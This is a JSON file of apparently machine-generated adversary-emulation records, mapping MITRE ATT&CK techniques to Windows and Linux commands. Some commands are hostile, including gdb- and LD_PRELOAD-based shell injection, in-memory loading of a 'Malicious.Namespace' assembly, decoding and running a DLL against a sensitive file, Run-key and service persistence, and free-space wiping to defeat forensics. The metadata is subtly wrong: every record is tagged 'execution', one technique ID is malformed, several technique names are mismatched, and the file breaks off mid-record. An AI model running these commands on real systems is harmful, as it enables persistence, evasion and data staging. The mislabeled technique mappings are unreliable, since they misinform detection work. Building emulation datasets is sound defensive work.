    {
      "id": "75659ecf-4e23-4485-b9f7-291e6e45dc10",
      "ttp_id": "unknown",
      "technique_id": "T1222.001",
      "technique_name": "File and Directory Permissions Modification",
      "tactic": "execution",
      "platform": "linux",
      "command": "sudo chattr +i /etc/hosts",
      "description": "Applies the immutable attribute to the system hosts file, preventing any modifications (including by root) until the attribute is removed.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The file /etc/hosts cannot be edited, renamed, or deleted; attempts to modify it will fail with an 'Operation not permitted' error.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:17.180770",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "81346fb5-8bab-48eb-9af8-dfa19a9fe2a0",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Data Encrypted",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -encode \"%TEMP%\\config.txt\" \"%TEMP%\\config.b64\"",
      "description": "Encodes a plain\u2011text configuration file to Base64 using the built\u2011in certutil utility, mimicking simple data encoding that could be used before exfiltration.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates %TEMP%\\config.b64 containing the Base64 representation of %TEMP%\\config.txt. No changes to system state beyond the new file.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:18.012453",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e5b972c3-6987-41c2-bd51-1c18f75ee8a6",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Data Encrypted",
      "tactic": "execution",
      "platform": "windows",
      "command": "cipher /E \"%TEMP%\\secret.txt\"",
      "description": "Encrypts a file with the Windows Encrypting File System (EFS) using the built\u2011in cipher.exe tool, representing a more realistic encryption of data at rest.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Marks %TEMP%\\secret.txt as encrypted for the current user. The file remains accessible only to the user\u2019s account; no data is exfiltrated.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:18.012453",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d7b195b6-b607-4813-8433-60a207a3e0c0",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Data Encrypted",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$plain='SensitiveData';$key=[byte[]](1..16);$iv=[byte[]](16..31);$aes=[System.Security.Cryptography.Aes]::Create();$aes.Key=$key;$aes.IV=$iv;$encryptor=$aes.CreateEncryptor();$bytes=[System.Text.Encoding]::UTF8.GetBytes($plain);$cipher=$encryptor.TransformFinalBlock($bytes,0,$bytes.Length);[IO.File]::WriteAllBytes('%TEMP%\\\\encrypted.bin',$cipher)\"",
      "description": "Uses PowerShell and .NET cryptography classes to AES\u2011encrypt a hard\u2011coded string and writes the ciphertext to a file, demonstrating custom stream\u2011cipher encryption in a command line.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates %TEMP%\\encrypted.bin containing the AES\u2011encrypted bytes of the string 'SensitiveData'. No network activity or persistence is performed.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:18.012918",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5cb5c229-94b1-4f1e-8252-cbd14106e9b8",
      "ttp_id": "unknown",
      "technique_id": "T1055.12",
      "technique_name": "Process Hollowing",
      "tactic": "execution",
      "platform": "linux",
      "command": "sleep 1000 & pid=$!; gdb -n -q -ex \"attach $pid\" -ex \"call (void)execve(\\\"/bin/sh\\\",0,0)\" -ex \"detach\" -ex \"quit\"",
      "description": "Spawns a sleeping process, then uses gdb to attach and replace its memory image with a /bin/sh shell via execve, demonstrating process hollowing (fork + exec).",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A new interactive shell is launched in place of the original sleep process; the original process ID remains the same but its code segment is replaced.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:19.228971",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "64fa6868-b208-4d8e-ab0c-1633b69eeabe",
      "ttp_id": "unknown",
      "technique_id": "T1055.12",
      "technique_name": "Process Hollowing",
      "tactic": "execution",
      "platform": "linux",
      "command": "script -q -c \"/bin/sleep 1000\" /dev/null & pid=$!; gdb -n -q -ex \"attach $pid\" -ex \"call (void)execve(\\\"/bin/sh\\\",0,0)\" -ex \"detach\" -ex \"quit\"",
      "description": "Uses the 'script' utility which internally calls fork and posix_openpt to create a pseudo\u2011terminal, then attaches with gdb to hollow the child process and inject a /bin/sh shell.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The child process created by script is hijacked; its original sleep binary is replaced with a shell, demonstrating hollowing via a PTY\u2011based fork.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:19.228971",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "32c6b150-9e15-45d4-b10d-323fa2aaecff",
      "ttp_id": "unknown",
      "technique_id": "T1055.12",
      "technique_name": "Process Hollowing",
      "tactic": "execution",
      "platform": "linux",
      "command": "LD_PRELOAD=/tmp/libhollow.so /bin/sleep 1000",
      "description": "Preloads a malicious shared library that intercepts execve calls; the library uses posix_openpt to open a pseudo\u2011terminal and then replaces the sleep process image with a payload (e.g., a shell).",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "When the sleep binary starts, the preloaded library hijacks execution and spawns a shell via a PTY, effectively hollowing the original process.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:19.228971",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "23cc451f-b73f-4ecb-b7f7-6421b751b597",
      "ttp_id": "unknown",
      "technique_id": "T1543",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "sc create TestService binPath= \"cmd.exe /c \\\"echo ServiceTest > %TEMP%\\\\svc.txt\\\"\" start= auto && sc start TestService",
      "description": "Creates a new Windows service named 'TestService' that runs a harmless cmd.exe command to write a test file, then starts the service.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A new service is registered and started; the service executes the command, resulting in a file %TEMP%\\svc.txt containing the text 'ServiceTest'.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:20.148951",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "1696e190-b8c1-4f68-a573-6da2d6b3081a",
      "ttp_id": "unknown",
      "technique_id": "T1543",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v TestRunKey /t REG_SZ /d \"powershell -Command \\\"Start-Process cmd.exe -ArgumentList '/c echo RegTest > %TEMP%\\\\reg.txt'\\\"\" /f",
      "description": "Adds a Run registry key that launches a PowerShell command at user logon, which in turn runs a cmd.exe command to create a test file.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "The registry entry 'TestRunKey' is created; on the next logon the command runs, creating %TEMP%\\reg.txt with the text 'RegTest'.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:20.148951",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3a65cdbb-43e9-44f3-90ad-7ad6a550ab9e",
      "ttp_id": "unknown",
      "technique_id": "T1543",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$proc = Start-Process -FilePath 'notepad.exe' -ArgumentList 'proc_testconn' -PassThru; Write-Host \\\"Started process ID $($proc.Id) with argument proc_testconn\\\"\"",
      "description": "Launches notepad.exe with a custom command-line argument 'proc_testconn' to simulate process manipulation detection; no elevated privileges are required.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Notepad starts with the argument 'proc_testconn'; the PowerShell script outputs the new process ID to the console.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:20.148951",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "8bf125bb-8e41-46fd-b6ed-a4a69a091557",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Process Creation",
      "tactic": "execution",
      "platform": "linux",
      "command": "sleep 60 &",
      "description": "Spawns a background sleep process using the built\u2011in `sleep` command, demonstrating a simple process creation via fork/execve.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A new `sleep` process is created and runs in the background for 60 seconds, visible via `ps` or `top`.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:20.891441",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4bbac6cf-4b3c-4e28-a837-3b50b484a5b9",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Process Creation",
      "tactic": "execution",
      "platform": "linux",
      "command": "nohup bash -c 'while true; do echo \"heartbeat\"; sleep 5; done' > /dev/null 2>&1 &",
      "description": "Creates a detached long\u2011running Bash loop using `nohup` and background execution, illustrating a more persistent process creation that could be flagged as suspicious.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A background Bash process is started that prints \"heartbeat\" every 5 seconds (output redirected to /dev/null). The process remains after the terminal closes.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:20.891441",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "46903b3c-465d-4d27-929c-900b0b81f9f3",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Process Creation",
      "tactic": "execution",
      "platform": "linux",
      "command": "tmpfile=$(mktemp /tmp/malicious.XXXX); echo -e '#!/bin/bash\\n/bin/sh' > \"$tmpfile\"; chmod +x \"$tmpfile\"; \"$tmpfile\" &",
      "description": "Generates a temporary executable script in /tmp, makes it executable, and launches it, mimicking a typical living\u2011off\u2011the\u2011land technique where an attacker drops and runs a payload from a writable directory.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A temporary file is created, marked executable, and executed, resulting in a new Bash shell process running in the background.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:20.891441",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e58a3715-6095-413c-928f-dbbe8dabef2b",
      "ttp_id": "unknown",
      "technique_id": "T1074",
      "technique_name": "Data Staging",
      "tactic": "execution",
      "platform": "windows",
      "command": "rundll32.exe %TEMP%\\\\dummy.dll,proc_upload \"C:\\\\Users\\\\Public\\\\test.txt\"",
      "description": "Invokes the exported function proc_upload from a dummy DLL placed in the temporary directory to simulate staging of a file.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The dummy DLL's proc_upload function is executed, which would normally read the specified file and prepare it for exfiltration.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:22.165616",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "80edff57-c51d-4d56-80df-1a1909f47fd4",
      "ttp_id": "unknown",
      "technique_id": "T1074",
      "technique_name": "Data Staging",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"certutil -decode $env:TEMP\\\\stage.b64 $env:TEMP\\\\stage.dll; rundll32.exe $env:TEMP\\\\stage.dll,proc_download 'C:\\\\Sensitive\\\\data.doc'\"",
      "description": "Decodes a base64\u2011encoded DLL (stage.b64) into stage.dll using certutil, then calls the proc_download function to simulate retrieving staged data.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "certutil creates a DLL file in the temp folder; rundll32 executes the proc_download export, which would normally read the target file and stage it for exfiltration.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:22.165616",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5e9fd588-c2b9-4de5-9410-2e0710647b0a",
      "ttp_id": "unknown",
      "technique_id": "T1074",
      "technique_name": "Data Staging",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$asm = [System.Reflection.Assembly]::Load([Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')); $type = $asm.GetType('Malicious.Namespace'); $method = $type.GetMethod('proc_upload'); $method.Invoke($null,$null)\"",
      "description": "Loads a base64\u2011encoded .NET assembly directly in PowerShell and invokes its static proc_upload method to emulate data staging logic.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "The assembly is loaded in memory and the proc_upload method runs, which would normally gather data and prepare it for exfiltration without writing files to disk.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:22.166128",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "71664482-ef7b-4105-9a04-100aa25fd13a",
      "ttp_id": "unknown",
      "technique_id": "T1070.004",
      "technique_name": "Indicator Removal on Host",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c del /f /q \"%TEMP%\\testlog.txt\"",
      "description": "Basic indicator removal \u2013 deletes a test log file from the temporary directory using the built\u2011in cmd.exe del command.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The file %TEMP%\\testlog.txt is permanently removed without prompting.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:23.120663",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e0107fad-994b-40cf-b83f-07ffade6bd34",
      "ttp_id": "unknown",
      "technique_id": "T1070.004",
      "technique_name": "Indicator Removal on Host",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Remove-Item -Path \\\"$env:TEMP\\testlog.txt\\\" -Force -ErrorAction SilentlyContinue\"",
      "description": "Intermediate removal \u2013 uses PowerShell Remove-Item with -Force to delete the test file and suppresses errors if the file is already absent.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The file $env:TEMP\\testlog.txt is deleted; any failure (e.g., file not found) is silently ignored.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:23.120663",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "1b223851-fcfc-4866-b822-6cdb98e3ce50",
      "ttp_id": "unknown",
      "technique_id": "T1070.004",
      "technique_name": "Indicator Removal on Host",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c del /f /q \"%TEMP%\\testlog.txt\" && cipher /w:\"%TEMP%\"",
      "description": "Advanced indicator removal \u2013 deletes the test file then runs cipher.exe with the /w switch to overwrite free space in the temp directory, making recovery of the deleted file more difficult.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "The file %TEMP%\\testlog.txt is deleted and the free space in %TEMP% is overwritten, reducing the chance of forensic recovery.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:23.120663",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "be0233c0-9fd2-4f4a-9571-f792e6224795",
      "ttp_id": "unknown",
      "technique_id": "T1083",
      "technique_name": "File and Directory Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c dir %SYSTEMROOT%\\System32",
      "description": "Lists the contents of the System32 directory using the built\u2011in cmd.exe `dir` command. Demonstrates basic file discovery without recursion.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command outputs a table of files and sub\u2011folders located in C:\\Windows\\System32 to the console.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:23.937213",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "35d9f24d-ca35-4429-963b-d5cbaa6230c9",
      "ttp_id": "unknown",
      "technique_id": "T1083",
      "technique_name": "File and Directory Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "wmic logicaldisk get name",
      "description": "Uses the built\u2011in WMIC utility to enumerate logical drive letters on the host, providing a high\u2011level view of available file system volumes.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a list of drive letters (e.g., C:, D:, etc.) to the console.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:23.937213",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "32997c62-8544-41d4-972b-32ce63801365",
      "ttp_id": "unknown",
      "technique_id": "T1083",
      "technique_name": "File and Directory Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -NoProfile -Command \"Get-ChildItem -Path $env:TEMP | Select-Object FullName, Length\"",
      "description": "PowerShell command that enumerates only the top\u2011level items in the user's temporary directory, showing each item's full path and size. No recursion is performed, keeping impact minimal.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Prints a list of files and folders located directly under %TEMP% with their full paths and byte sizes.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:23.937213",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "1213d24e-0efe-4055-b448-c8a1e1b9c35e",
      "ttp_id": "unknown",
      "technique_id": "T1049",
      "technique_name": "System Network Connections Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "netstat -ano",
      "description": "Uses the built\u2011in netstat utility to list all active TCP and UDP connections along with the owning process IDs. This is the classic method for System Network Connections Discovery.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a table of local and remote addresses, ports, connection state, and the PID of the process that owns each socket.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:24.746290",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c3016c1b-370f-4648-b474-d4897ebfa304",
      "ttp_id": "unknown",
      "technique_id": "T1049",
      "technique_name": "System Network Connections Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Get-NetTCPConnection | Select-Object -Property LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess\"",
      "description": "PowerShell cmdlet that retrieves TCP connection information in a structured way, filtering to the most relevant fields for discovery. Preferred when PowerShell is available.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays a list of current TCP connections with local/remote IPs, ports, connection state, and owning process IDs.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:24.746290",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "0128de11-7126-42ca-8e23-edb25e7b50b7",
      "ttp_id": "unknown",
      "technique_id": "T1049",
      "technique_name": "System Network Connections Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"netstat -ano | Select-String 'LISTENING' | ForEach-Object { $_.Line }\"",
      "description": "Combines netstat with PowerShell filtering to show only listening sockets, reducing noise and emulating a more targeted discovery script.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Prints only the lines from netstat output that contain the word LISTENING, showing which processes are listening for inbound connections.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:24.746290",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "1da416fd-ba86-4d8c-940e-16b7a160e8d3",
      "ttp_id": "unknown",
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "systeminfo",
      "description": "Runs the built\u2011in SystemInfo utility to display OS version, build number, system manufacturer, model, BIOS version, and other host details.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a multi\u2011line summary of the host's operating system and hardware information to the console.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:25.486973",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f8bf9899-ba28-496d-b1fc-3a86aa6bda5f",
      "ttp_id": "unknown",
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "wmic os get Caption,Version,BuildNumber /value",
      "description": "Uses WMIC to query the operating system for its friendly name, version, and build number, a common technique for system information discovery.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints key OS properties (Caption, Version, BuildNumber) in a name=value format.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:25.486973",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "56a4c554-abec-4dc5-98de-4aa861cdaa34",
      "ttp_id": "unknown",
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Name,Manufacturer,Model; Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object Caption,Version,BuildNumber\"",
      "description": "PowerShell command that queries CIM classes for detailed computer system and operating system information, providing a richer data set than basic binaries.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays the computer name, manufacturer, model, OS caption, version, and build number in a formatted table.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:25.486973",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a6464e43-e357-40ca-8cc2-aecb7e740c15",
      "ttp_id": "unknown",
      "technique_id": "T1016.001",
      "technique_name": "System Network Configuration Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "ipconfig /all",
      "description": "Runs the built\u2011in ipconfig utility to display detailed network adapter configuration, including IP addresses, subnet masks, gateways, and DNS servers.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command outputs a text block to the console listing each network interface and its full configuration.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:26.645281",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4dc40f8d-ff84-4d68-8985-b68df8f0744b",
      "ttp_id": "unknown",
      "technique_id": "T1016.001",
      "technique_name": "System Network Configuration Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "netsh interface ip show config",
      "description": "Uses the netsh binary to query the IP configuration of all network interfaces, revealing addresses, DHCP status, and routing information.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays the IP settings for each interface in a formatted list on the console.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:26.645281",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "55ba4a05-87c5-4446-9408-c9b4c0a433ff",
      "ttp_id": "unknown",
      "technique_id": "T1016.001",
      "technique_name": "System Network Configuration Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "wmic nicconfig get Description, IPAddress, DefaultIPGateway, DNSServerSearchOrder /format:list",
      "description": "Leverages WMIC to retrieve network configuration properties from the Win32_NetworkAdapterConfiguration class, providing a concise list of each adapter's description, IP address(es), default gateway, and DNS servers.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a series of key\u2011value pairs for each network adapter, showing its current network settings.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:26.645281",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "47c6262a-efd4-4650-97fe-41d7856ab6a6",
      "ttp_id": "unknown",
      "technique_id": "T1033",
      "technique_name": "System Owner/User Discovery",
      "tactic": "execution",
      "platform": "linux",
      "command": "id -un",
      "description": "Uses the built\u2011in `id` utility to retrieve the effective username of the current process (system owner discovery).",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints the current user's login name to stdout, e.g., `root` or `alice`.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:27.587412",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4ffa85c8-480a-477a-8182-0c80eaa7b5f2",
      "ttp_id": "unknown",
      "technique_id": "T1033",
      "technique_name": "System Owner/User Discovery",
      "tactic": "execution",
      "platform": "linux",
      "command": "getent passwd $(id -u)",
      "description": "Queries the system's password database for the entry matching the current UID, revealing username, UID, GID, home directory and login shell.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a single line from /etc/passwd (or NSS sources) such as `alice:x:1000:1000:Alice:/home/alice:/bin/bash`.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:27.587919",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "1d4c4b92-98a2-4e94-8777-ad9b15b969e1",
      "ttp_id": "unknown",
      "technique_id": "T1033",
      "technique_name": "System Owner/User Discovery",
      "tactic": "execution",
      "platform": "linux",
      "command": "awk -F: -v uid=$(id -u) '$3 == uid {print \"User:\", $1, \"UID:\", $3, \"Home:\", $6, \"Shell:\", $7}' /etc/passwd",
      "description": "Parses /etc/passwd with awk to locate the record whose UID matches the current process UID, extracting detailed user information.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints a formatted line, e.g., `User: alice UID: 1000 Home: /home/alice Shell: /bin/bash`.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:27.587919",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2339163a-ec0c-4d76-9f85-df65f41d1daf",
      "ttp_id": "unknown",
      "technique_id": "T1010",
      "technique_name": "Application Window Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "tasklist /v /fo csv | findstr /i \"Console\"",
      "description": "Lists all running processes with verbose output and filters for entries that have a non\u2011empty window title (e.g., console windows). This demonstrates basic application window discovery using a built\u2011in binary.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command prints CSV lines for each process that has a visible window title containing the word \"Console\". No system changes are made.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:28.502542",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9b253e8c-0470-45c2-bb6b-ca08270e1c11",
      "ttp_id": "unknown",
      "technique_id": "T1010",
      "technique_name": "Application Window Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$ws = Get-Process | Where-Object { $_.MainWindowTitle -ne '' }; foreach ($p in $ws) { Write-Output \\\"Process: $($p.Name) Title: $($p.MainWindowTitle)\\\" }\"",
      "description": "Uses PowerShell to enumerate all processes that own a main window and prints each process name together with its window title. This provides a more detailed view than tasklist and still relies only on built\u2011in utilities.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command outputs lines such as \"Process: notepad Title: Untitled - Notepad\" for each process that has a visible UI window. No modifications to the system occur.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:28.502542",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b21bb44c-9536-4418-81ae-65fd966d4e32",
      "ttp_id": "unknown",
      "technique_id": "T1010",
      "technique_name": "Application Window Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type @'using System; using System.Runtime.InteropServices; public class Win32 { [DllImport(\\\"user32.dll\\\", SetLastError=true)] public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam); public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam); [DllImport(\\\"user32.dll\\\", SetLastError=true, CharSet=CharSet.Unicode)] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount); [DllImport(\\\"user32.dll\\\", SetLastError=true)] public static extern bool IsWindowVisible(IntPtr hWnd); }'@; $list = New-Object System.Collections.Generic.List[object]; $callback = [Win32+EnumWindowsProc]{ param($hWnd,$lParam); if ([Win32]::IsWindowVisible($hWnd)) { $sb = New-Object System.Text.StringBuilder 256; [Win32]::GetWindowText($hWnd,$sb,256) | Out-Null; $title = $sb.ToString(); if ($title -and $title.Trim().Length -gt 0) { $list.Add($title) } }; return $true }; [Win32]::EnumWindows($callback,[IntPtr]::Zero) | Out-Null; foreach ($t in $list) { Write-Output \\\"Window Title: $t\\\" }\"",
      "description": "Advanced enumeration using direct Win32 API calls via PowerShell's Add-Type. Calls EnumWindows to iterate over all top\u2011level windows, filters for visible windows with non\u2011empty titles, and prints each title. This mimics low\u2011level application window discovery techniques used by sophisticated malware.",
      "requires_admin": false,
      "safety_level": "medium",
